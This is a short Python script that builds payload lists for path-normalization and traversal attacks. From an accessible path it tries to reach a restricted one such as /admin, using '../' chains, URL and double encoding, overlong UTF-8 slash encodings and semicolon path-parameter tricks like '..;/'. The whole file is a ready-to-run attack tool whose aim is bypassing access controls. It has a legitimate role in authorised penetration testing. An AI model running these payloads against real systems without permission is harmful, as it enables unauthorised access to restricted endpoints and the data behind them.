import urllib.parse

def generate_payloads(accessible_path, restricted_path):
    """
    Generates payloads to test for path normalization attacks.

    :param accessible_path: The path you can access (e.g., "/api/user").
    :param restricted_path: The path you want to test access to (e.g., "/admin/users , /internal-api").
    :return: List of payloads.
    """
    payloads = []

    # Basic Traversal
    traversal_levels = accessible_path.count("/")
    for i in range(1, traversal_levels + 2):
        payload = "../" * i + restricted_path.lstrip("/")
        payloads.append(payload)

    # Encoded Variants
    encoded_restricted = urllib.parse.quote(restricted_path)
    for i in range(1, traversal_levels + 2):
        payload = "../" * i + encoded_restricted.lstrip("/")
        payloads.append(payload)

    # Double Encoding
    double_encoded_restricted = urllib.parse.quote_plus(encoded_restricted)
    for i in range(1, traversal_levels + 2):
        payload = "../" * i + double_encoded_restricted.lstrip("/")
        payloads.append(payload)

    # Unicode Encodings
    unicode_variants = [
        restricted_path.replace("/", "%c0%af"),
        restricted_path.replace("/", "%e0%80%af"),
    ]
    for variant in unicode_variants:
        for i in range(1, traversal_levels + 2):
            payload = "../" * i + variant.lstrip("/")
            payloads.append(payload)

    # Mixed Encoding
    for i in range(1, traversal_levels + 2):
        mixed_payload = "..%2f" * i + restricted_path.lstrip("/")
        payloads.append(mixed_payload)

    # Accessible Path with Semicolon
    semicolon_payloads = [
        f"{accessible_path}/..;/{restricted_path.lstrip('/')}",
        f"{accessible_path}/.;/{restricted_path.lstrip('/')}",
        f"{accessible_path}/..%2f;/{restricted_path.lstrip('/')}"
    ]
    payloads.extend(semicolon_payloads)

    # Additional Path Tricks
    additional_payloads = [
        f"{accessible_path}/..;/..;/../{restricted_path.lstrip('/')}",
        f"{accessible_path}/..%2f..;/..;/../{restricted_path.lstrip('/')}",
        f"{accessible_path}/..\;/../{restricted_path.lstrip('/')}"
    ]
    payloads.extend(additional_payloads)

    # New Payloads
    new_payloads = [
        f"{accessible_path}/%2e%2e/%2e%2e/{restricted_path.lstrip('/')}",
        f"{accessible_path}/..;a=a/..;a=a/{restricted_path.lstrip('/')}",
        f"{accessible_path}/..;/..;/{restricted_path.lstrip('/')}",
        f"{accessible_path}../{restricted_path.lstrip('/')}",
        f"{accessible_path};/..;/{restricted_path.lstrip('/')}",
        f"{accessible_path};name=z5jt/{restricted_path.lstrip('/')}"
    ]
    payloads.extend(new_payloads)

    return payloads

# Example Usage
if __name__ == "__main__":
    accessible_path = input("Enter the accessible path (e.g., /api/user): ").strip()
    restricted_path = input("Enter the restricted path (e.g., /admin/users , /internal-api): ").strip()

    print("\nGenerating payloads...")
    payloads = generate_payloads(accessible_path, restricted_path)

    print("\nPayloads:")
    for payload in payloads:
        print(payload)
